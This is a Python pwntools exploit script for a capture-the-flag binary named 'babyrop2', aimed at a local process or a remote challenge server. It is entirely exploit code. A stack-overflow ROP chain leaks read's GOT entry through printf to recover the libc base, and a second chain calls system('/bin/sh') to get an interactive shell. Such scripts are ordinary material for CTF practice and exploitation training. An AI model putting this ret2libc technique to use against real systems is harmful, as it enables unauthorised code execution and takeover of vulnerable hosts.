import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./babyrop2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./babyrop2')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',28045)
			elf=ELF('babyrop2')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')


		pop_rdi=0x0000000000400733
		__start=0x400540
		pay='a'*0x28+p64(pop_rdi)+p64(elf.got['read'])+p64(elf.plt['printf'])+p64(__start)+'\x00\x0000'
		io.recv()
		io.sendline(pay)
		io.recv(0x3f)
		libc_base=u64(io.recv()[:6]+'\x00\x00')-libc.sym['read']
		libc.address=libc_base
		success('libc_base:'+hex(libc_base))
		pay='a'*0x28+p64(pop_rdi)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])+p64(__start)+'\x00\x0000'
		io.sendline(pay)
		



		#gdb.attach(io)
		#pause()
		io.interactive()
	except Exception as e:
		raise e
	else:
		pass